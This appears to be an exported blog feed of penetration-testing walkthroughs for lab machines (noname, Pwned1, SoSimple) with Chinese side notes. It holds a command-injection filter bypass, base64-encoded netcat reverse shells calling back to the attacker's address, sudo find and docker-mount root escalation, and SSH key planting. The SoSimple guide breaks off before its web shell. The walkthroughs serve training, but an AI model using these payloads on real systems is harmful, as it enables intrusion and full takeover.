<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ gobuster dir -w /usr/share/dirb/wordlists/common.txt —url http://192.168.249.15</span><br><span class="line">...</span><br><span class="line">/.hta (Status: 403)</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/admin (Status: 200)</span><br><span class="line">/index.php (Status: 200)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Image-Steganography"><a href="#Image-Steganography" class="headerlink" title="Image Steganography"></a><strong>Image Steganography</strong></h3><p>Navigating to that directory (<a href="http://192.168.120.68/admin">http://192.168.120.68/admin</a>), we are met with <code>HacLabs directory of gallery.</code>, followed by four images: <strong>ctf-01.jpg</strong>, <strong>haclabs.jpeg</strong>, <strong>new.jpg</strong>, and <strong>Short.png</strong>. We will download all the images for further analysis.</p>
<p>If we look at line 60 in the source code of the default file in the <em>/admin</em> directory, we will find the following commented out text:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!—passphrase:harder—&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We will Install <code>steghide</code> to assist in retrieving any information hidden away in the images.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo apt-get install steghide -y</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Now that we have the images and the passphrase <code>harder</code>, we can use <code>steghide</code> to reveal hidden information inside the images. By analysing the image <strong>haclabs.jpeg</strong> and providing the passphrase, we discover a new file <strong>superadmin.php</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ steghide extract -sf haclabs.jpeg</span><br><span class="line">Enter passphrase:</span><br><span class="line">wrote extracted data to &quot;imp.txt&quot;.</span><br><span class="line">root@kali:~/Documents/VulnHub/noname# cat imp.txt</span><br><span class="line">c3VwZXJhZG1pbi5waHA=</span><br><span class="line">root@kali:~/Documents/VulnHub/noname# cat imp.txt | base64 -d</span><br><span class="line">superadmin.phpkali@kali:~$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="Command-Injection-Vulnerability"><a href="#Command-Injection-Vulnerability" class="headerlink" title="Command Injection Vulnerability"></a><strong>Command Injection Vulnerability</strong></h3><p>Navigating to <a href="http://192.168.54.15/superadmin.php">http://192.168.54.15/superadmin.php</a>, we are met with an “Enter an IP to ping” text box. We can clearly see that we have some command execution on the target after entering the following:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 | id</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We observe the desired output:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>

<p>However, getting a reverse shell right away does not seem to be working. This is probably caused by a basic input filter setup in the application. We can extract the server-side code into a base64 format and then decode it on our Kali machine. Let’s enter:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 | cat superadmin.php |  base64</span><br></pre></td></tr></table></figure>

<p>We can see that the source code of the page is as follows:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php   if (isset($_POST[&#x27;submitt&#x27;]))&#123;   	$word=array(&quot;;&quot;,&quot;&amp;&amp;&quot;,&quot;/&quot;,&quot;bin&quot;,&quot;&amp;&quot;,&quot; &amp;&amp;&quot;,&quot;ls&quot;,&quot;nc&quot;,&quot;dir&quot;,&quot;pwd&quot;);   	$pinged=$_POST[&#x27;pinger&#x27;];   	$newStr = str_replace($word, &quot;&quot;, $pinged);   	if(strcmp($pinged, $newStr) == 0)		&#123;		    $flag=1;		&#125;       else		&#123;		   $flag=0;		&#125;&#125;if ($flag==1)&#123;$outer=shell_exec(&quot;ping -c 3 $pinged&quot;);echo &quot;&lt;pre&gt;$outer&lt;/pre&gt;&quot;;&#125;?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a><strong>Reverse Shell</strong></h3><p>We can bypass the filtering put in place by creating a <strong>bash</strong> reverse shell and encoding it in base64. We can use the following shell for this purpose:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -I 2&gt;&amp;1|nc 192.168.49.249 80 &gt;/tmp/f</span><br></pre></td></tr></table></figure>

<p>Let’s save it to a file named <strong>rev.txt</strong>. We need to base64-encode it before pasting into the textbox:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ cat rev.txt| base64cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC40OS4yNDkgODAgPi90bXAvZgo=</span><br></pre></td></tr></table></figure>

<p>We will set up a netcat listener on our Kali machine on port 80, and then deliver our payload to the vulnerable web application with the following command:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 | echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC40OS4yNDkgODAgPi90bXAvZgo= | base64 -d | bash</span><br></pre></td></tr></table></figure>

<p>Our reverse shell will be available on our netcat listener once the command has been executed on the target:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nc -lvp 80listening on [any] 80 ...192.168.249.15: inverse host lookup failed: Unknown hostconnect to [192.168.49.249] from (UNKNOWN) [192.168.249.15] 35286/bin/sh: 0: can&#x27;t access tty; job control turned off$ iduid=33(www-data) gid=33(www-data) groups=33(www-data)$ python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;www-data@haclabs:/var/www/html$</span><br></pre></td></tr></table></figure>

<h2 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a><strong>Escalation</strong></h2><h3 id="Recovering-Hidden-Credentials"><a href="#Recovering-Hidden-Credentials" class="headerlink" title="Recovering Hidden Credentials"></a><strong>Recovering Hidden Credentials</strong></h3><p>The contents of the file <strong>flag1.txt</strong> in the home directory of <code>yash</code> suggests that there is a hidden file on the system that contains the needed credentials to continue.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@haclabs:/var/www/html$ cd /home/yash &amp;&amp; ls -lacd /home/yash &amp;&amp; ls -latotal 32drwxr-xr-x 5 yash yash 4096 Feb 15 16:28 .drwxr-xr-x 4 root root 4096 Jan 27 20:32 ..-rw------- 1 yash yash    0 Mar 14 00:52 .bash_history-rw-r--r-- 1 yash yash 3771 Jan 27 20:32 .bashrcdrwx------ 2 yash yash 4096 Feb  9 18:06 .cachedrwx------ 3 yash yash 4096 Jan 27 20:33 .gnupgdrwxrwxr-x 3 yash yash 4096 Jan 27 20:35 .local-rw-r--r-- 1 yash yash  807 Jan 27 20:32 .profile-rw-rw-r-- 1 yash yash   77 Jan 30 03:56 flag1.txtwww-data@haclabs:/home/yash$www-data@haclabs:/home/yash$ cat flag1.txtcat flag1.txtDue to some security issues,I have saved haclabs password in a hidden file.</span><br></pre></td></tr></table></figure>

<p>Running the <strong>find</strong> command for all files owned by <code>yash</code> reveals the location of the hidden file to be <strong>/usr/share/hidden/.passwd</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@haclabs:/home/yash$ find / -type f -user yash 2&gt;/dev/nullfind / -type f -user yash 2&gt;/dev/null/home/yash/flag1.txt/home/yash/.bashrc/home/yash/.cache/motd.legal-displayed/home/yash/.profile/home/yash/.bash_history/usr/share/hidden/.passwd</span><br></pre></td></tr></table></figure>

<p>Inside the file, we find the needed credentials:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@haclabs:/home/yash$ cat /usr/share/hidden/.passwdcat /usr/share/hidden/.passwdhaclabs1234</span><br></pre></td></tr></table></figure>

<p>We have the password for the user <code>haclabs</code>. From this point, we can simply <code>su</code> into the account:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@haclabs:/home/yash$ su haclabssu haclabsPassword: haclabs1234haclabs@haclabs:/home/yash$</span><br></pre></td></tr></table></figure>

<h3 id="Sudo"><a href="#Sudo" class="headerlink" title="Sudo"></a><strong>Sudo</strong></h3><p>Once we are authenticated as the user <code>haclabs</code>, we run <code>sudo -l</code> to determine that we can run <strong>find</strong> with elevated privileges:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">haclabs@haclabs:/home/yash$ sudo -lsudo -lMatching Defaults entries for haclabs on haclabs:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser haclabs may run the following commands on haclabs:    (root) NOPASSWD: /usr/bin/find</span><br></pre></td></tr></table></figure>

<p>We can spawn a root shell by running <strong>find</strong> via sudo and utilising its ability to spawn a shell:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">haclabs@haclabs:/home/yash$ sudo find . -exec /bin/sh \; -quit# ididuid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<p>Focus：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1 | ‘<span class="built_in">echo</span> <span class="string">&quot;bmMudHJhZGl0aW9uYWwgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNDkuMTEwIDc3ODg=&quot;</span> | base64 -d ’</span><br></pre></td></tr></table></figure>

<p>注意echo前后的中文引号（非英文引号）</p>
<p>base64编码解码在线网站：<a href="https://www.base64encode.org/">https://www.base64encode.org/</a></p>
]]></content>
      <categories>
        <category>Linux Walkthrough</category>
      </categories>
      <tags>
        <tag>Reverse Shell</tag>
        <tag>Steganography</tag>
        <tag>Injection</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwned1</title>
    <url>/undefined/Pwned1/</url>
    <content><![CDATA[<h1 id="Exploitation-Guide-for-Pwned1"><a href="#Exploitation-Guide-for-Pwned1" class="headerlink" title="Exploitation Guide for Pwned1"></a><strong>Exploitation Guide for Pwned1</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We start off by running an <code>nmap</code> scan:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ nmap 192.168.120.220</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-08 16:54 EDT</span><br><span class="line">Nmap scan report for 192.168.120.220</span><br><span class="line">Host is up (0.038s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Web-application"><a href="#Web-application" class="headerlink" title="Web application"></a><strong>Web application</strong></h3><p>We start off by exploring the web app.There is nothing really worthy on the main page but the <code>/robots.txt</code> page reveals interesting pages to explore.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.120.220/robots.txt</span><br><span class="line"># Group 1</span><br><span class="line"></span><br><span class="line">User-agent: *</span><br><span class="line">Allow: /nothing</span><br><span class="line">Allow: /hidden_text</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Exploring that <code>/hidden_text</code> page, we find a directory listing which leads to <code>/secret.dic</code> page.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.120.220/hidden_text/secret.dic</span><br><span class="line">/hacked</span><br><span class="line">/vanakam_nanba</span><br><span class="line">/hackerman.gif</span><br><span class="line">/facebook</span><br><span class="line">/whatsapp</span><br><span class="line">/instagram</span><br><span class="line">/pwned</span><br><span class="line">/pwned.com</span><br><span class="line">/pubg</span><br><span class="line">/cod</span><br><span class="line">/fortnite</span><br><span class="line">/youtube</span><br><span class="line">/kali.org</span><br><span class="line">/hacked.vuln</span><br><span class="line">/users.vuln</span><br><span class="line">/passwd.vuln</span><br><span class="line">/pwned.vuln</span><br><span class="line">/backup.vuln</span><br><span class="line">/.ssh</span><br><span class="line">/root</span><br><span class="line">/home</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We try a few of those but most don’t seem to work. Let’s automate the tries instead of checking them all one by one.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.120.220/hidden_text/secret.dic &gt; /tmp/secret.dic</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">kali@kali:~$ gobuster dir -u http://192.168.120.220 -w /tmp/secret.dic</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://192.168.120.220</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /tmp/secret.dic</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2020/09/08 17:11:35 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">//pwned.vuln (Status: 301)</span><br><span class="line">===============================================================</span><br><span class="line">2020/09/08 17:11:36 Finished</span><br><span class="line">===============================================================</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We find that only <code>/pwned.vuln</code> is valid. If we go to that page, we can find some credentials in the comments.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.120.220/pwned.vuln/</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">...</span><br><span class="line">&lt;?php</span><br><span class="line">...</span><br><span class="line">//	if ($un==&#x27;ftpuser&#x27; &amp;&amp; $pw==&#x27;B0ss_Pr!ncesS&#x27;) &#123;</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="Exploring-the-FTP-server"><a href="#Exploring-the-FTP-server" class="headerlink" title="Exploring the FTP server"></a><strong>Exploring the FTP server</strong></h3><p>By using the credentials found earlier, we can log in to the FTP server. In it, we find two interesting files.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ ftp 192.168.120.220</span><br><span class="line">Connected to 192.168.120.220.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (192.168.120.220:vagrant): ftpuser</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    2 0        0            4096 Jul 10 12:47 share</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; cd share</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 0        0            2602 Jul 09 15:05 id_rsa</span><br><span class="line">-rw-r--r--    1 0        0              75 Jul 09 17:41 note.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>The first one is a private SSH key, and the other one is a note that conveniently contains the associated username.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ cat note.txt</span><br><span class="line"></span><br><span class="line">Wow you are here</span><br><span class="line"></span><br><span class="line">ariana won&#x27;t happy about this note</span><br><span class="line"></span><br><span class="line">sorry ariana :(</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a><strong>SSH</strong></h3><p>Using the <strong>id_rsa</strong> key we found, we can SSH to the machine.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ chmod 400 id_rsa</span><br><span class="line">kali@kali:~$ ssh -i id_rsa ariana@192.168.120.220</span><br><span class="line">...</span><br><span class="line">ariana@pwned:~$ id</span><br><span class="line">uid=1000(ariana) gid=1000(ariana) groups=1000(ariana),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a><strong>Escalation</strong></h2><h3 id="Local-Enumeration"><a href="#Local-Enumeration" class="headerlink" title="Local Enumeration"></a><strong>Local Enumeration</strong></h3><p>Let’s look at the commands our user is allowed to run with <code>sudo</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ariana@pwned:~$ sudo -l</span><br><span class="line">Matching Defaults entries for ariana on pwned:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User ariana may run the following commands on pwned:</span><br><span class="line">    (selena) NOPASSWD: /home/messenger.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Let’s see this script with <code>cat /home/messenger.sh</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">clear</span><br><span class="line">echo &quot;Welcome to linux.messenger &quot;</span><br><span class="line">		echo &quot;&quot;</span><br><span class="line">users=$(cat /etc/passwd | grep home |  cut -d/ -f 3)</span><br><span class="line">		echo &quot;&quot;</span><br><span class="line">echo &quot;$users&quot;</span><br><span class="line">		echo &quot;&quot;</span><br><span class="line">read -p &quot;Enter username to send message : &quot; name</span><br><span class="line">		echo &quot;&quot;</span><br><span class="line">read -p &quot;Enter message for $name :&quot; msg</span><br><span class="line">		echo &quot;&quot;</span><br><span class="line">echo &quot;Sending message to $name &quot;</span><br><span class="line"></span><br><span class="line">$msg 2&gt; /dev/null</span><br><span class="line"></span><br><span class="line">		echo &quot;&quot;</span><br><span class="line">echo &quot;Message sent to $name :) &quot;</span><br><span class="line">		echo &quot;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Exploiting-the-script"><a href="#Exploiting-the-script" class="headerlink" title="Exploiting the script"></a><strong>Exploiting the script</strong></h3><p>Looks like this script is running what we pass to the “Enter message for $name” prompt and then sends it to <code>/dev/null</code>.We can use this to run a shell. Since we run it as sudo, this will give us a shell as the selena user.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ariana@pwned:~$ sudo -u selena /home/messenger.sh</span><br><span class="line"></span><br><span class="line">Welcome to linux.messenger</span><br><span class="line"></span><br><span class="line">ariana:</span><br><span class="line">selena:</span><br><span class="line">ftpuser:</span><br><span class="line"></span><br><span class="line">Enter username to send message : whatever</span><br><span class="line"></span><br><span class="line">Enter message for whatever :/bin/bash</span><br><span class="line"></span><br><span class="line">Sending message to whatever</span><br><span class="line">id</span><br><span class="line">uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)</span><br><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">selena@pwned:/home/ariana$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Escalating-to-root"><a href="#Escalating-to-root" class="headerlink" title="Escalating to root"></a><strong>Escalating to root</strong></h3><p>In the <code>id</code> command above, we can see that we are in the <strong>docker</strong> group.This allows us to do very nasty things: <a href="https://docs.docker.com/engine/security/security/#docker-daemon-attack-surface">https://docs.docker.com/engine/security/security/#docker-daemon-attack-surface</a></p>
<p>Let’s see what images are available.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">selena@pwned:/home/ariana$ docker image ls</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">privesc             latest              09ae39f0f8fc        2 months ago        88.3MB</span><br><span class="line">&lt;none&gt;              &lt;none&gt;              e13ad046d435        2 months ago        88.3MB</span><br><span class="line">alpine              latest              a24bb4013296        3 months ago        5.57MB</span><br><span class="line">debian              wheezy              10fcec6d95c4        18 months ago       88.3MB</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>alpine</strong> images are usually pretty bare bones but any of the other 2 images will do just fine for our needs (<strong>privesc</strong> is a fairly obvious hint, but we don’t need to use that one).As shown by the link above, we can mount the host’s <code>/</code> folder inside of a container.Since SSH is open on the machine, we’ll use this to edit the root’s <strong>authorized_keys</strong> file.</p>
<p>We can simply paste our host’s public key here.If you don’t have an SSH key pair created, you can use the <code>ssh-keygen</code> command.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">selena@pwned:/home/ariana$ docker run -it -v /:/host debian:wheezy sh</span><br><span class="line"># cd /host/root</span><br><span class="line"># ls -al</span><br><span class="line">total 28</span><br><span class="line">drwx------  3 root root 4096 Jul 10 07:32 .</span><br><span class="line">drwxr-xr-x 18 root root 4096 Aug 11 08:14 ..</span><br><span class="line">-rw-------  1 root root  264 Sep  8 19:53 .bash_history</span><br><span class="line">-rw-r--r--  1 root root  601 Jul  6 12:40 .bashrc</span><br><span class="line">drwxr-xr-x  3 root root 4096 Jul  4 14:02 .local</span><br><span class="line">-rw-r--r--  1 root root  148 Aug 17  2015 .profile</span><br><span class="line">-rw-r--r--  1 root root  429 Jul 10 06:41 root.txt</span><br><span class="line"># mkdir .ssh</span><br><span class="line"># echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcKw2si1MnX9Zc2qlnoPvILKv9EI/2hISK4Gy0a6cIMRjys3oxkv5CEBdSMCA33K8IDniHC6vhf1D9xM9fjjEgocu45CJnRtGyX4ewfduqdwkQlOirqStYP9mjkjmqSj65dU3fAk3LZjZNxUjPPY7GvELeJyLzIUlOgnWKKo/sYOcyHcG9PZpQDngcEJ5jbEs/8meNp+ejaGUegyn8TZfG/4Gy18uUkIEV1Muc2Xc9e+KQOWZ3SehxJQwqGZycTGJBy49hA8/1iHOsyQyr/lgnkVewEyB2i9tN7WqrZeMY+DqvDP/qxIHGf4U17NKqM/npAAviH6noeDBZZEQq56Ad kali@kali&#x27; &gt; .ssh/authorized_keys</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Then we can SSH to the machine as root.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ ssh root@192.168.120.220</span><br><span class="line">...</span><br><span class="line">root@pwned:~# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<p>Focus:</p>
<p>docker提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -v /:/mnt --rm -it privesc chroot /mnt sh</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Linux Walkthrough</category>
      </categories>
      <tags>
        <tag>Script</tag>
        <tag>Ftp</tag>
      </tags>
  </entry>
  <entry>
    <title>SoSimple</title>
    <url>/undefined/SoSimple/</url>
    <content><![CDATA[<h1 id="Exploitation-Guide-for-SoSimple"><a href="#Exploitation-Guide-for-SoSimple" class="headerlink" title="Exploitation Guide for SoSimple"></a><strong>Exploitation Guide for SoSimple</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We start off by running an <code>nmap</code> scan:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~# sudo nmap 192.168.120.192</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-21 22:51 EDT</span><br><span class="line">Nmap scan report for 192.168.120.192</span><br><span class="line">Host is up (0.29s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Dirb"><a href="#Dirb" class="headerlink" title="Dirb"></a><strong>Dirb</strong></h3><p>Using <code>dirb</code>, we can brute force web directories to reveal <em>/wordpress</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~# dirb http://192.168.120.192/</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Fri Aug 21 22:54:51 2020</span><br><span class="line">URL_BASE: http://192.168.120.192/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.120.192/ ----</span><br><span class="line">+ http://192.168.120.192/index.html (CODE:200|SIZE:495)</span><br><span class="line">+ http://192.168.120.192/server-status (CODE:403|SIZE:280)</span><br><span class="line">==&gt; DIRECTORY: http://192.168.120.192/wordpress/</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a><strong>Web Enumeration</strong></h3><p>Our next step is to run <code>wpscan</code> to see if we can identify any vulnerabilities and any usernames.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~# wpscan --url http://192.168.120.192/wordpress/ --enumerate p</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#x27;_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.1</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[+] URL: http://192.168.120.192/wordpress/ [192.168.120.192]</span><br><span class="line">[+] Started: Fri Aug 21 23:27:01 2020</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">[+] social-warfare</span><br><span class="line"> | Location: http://192.168.120.192/wordpress/wp-content/plugins/social-warfare/</span><br><span class="line"> | Last Updated: 2020-08-18T17:05:00.000Z</span><br><span class="line"> | [!] The version is out of date, the latest version is 4.1.0</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> | Confirmed By: Comment (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 3.5.0 (100% confidence)</span><br><span class="line"> | Found By: Comment (Passive Detection)</span><br><span class="line"> |  - http://192.168.120.192/wordpress/, Match: &#x27;Social Warfare v3.5.0&#x27;</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Query Parameter (Passive Detection)</span><br><span class="line"> |   - http://192.168.120.192/wordpress/wp-content/plugins/social-warfare/assets/css/style.min.css?ver=3.5.0</span><br><span class="line"> |   - http://192.168.120.192/wordpress/wp-content/plugins/social-warfare/assets/js/script.min.js?ver=3.5.0</span><br><span class="line"> |  Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |   - http://192.168.120.192/wordpress/wp-content/plugins/social-warfare/readme.txt</span><br><span class="line"> |  Readme - ChangeLog Section (Aggressive Detection)</span><br><span class="line"> |   - http://192.168.120.192/wordpress/wp-content/plugins/social-warfare/readme.txt</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We can see <code>wpscan</code> identified the <code>social-warfare</code> plugin and the version detected is <code>3.5.0</code>.</p>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="Social-Warfare-Remote-Code-Execution"><a href="#Social-Warfare-Remote-Code-Execution" class="headerlink" title="Social Warfare Remote Code Execution"></a><strong>Social Warfare Remote Code Execution</strong></h3><p>Searching for <code>Social Warfare</code> on Exploit Database we find <a href="https://www.exploit-db.com/exploits/46794">this entry</a> detailing a Remote File Inclusion vulnerability in the plugin.</p>
<p>To exploit the plugin we will first create the following PHP web shell and save it as <code>payload.txt</code></p>
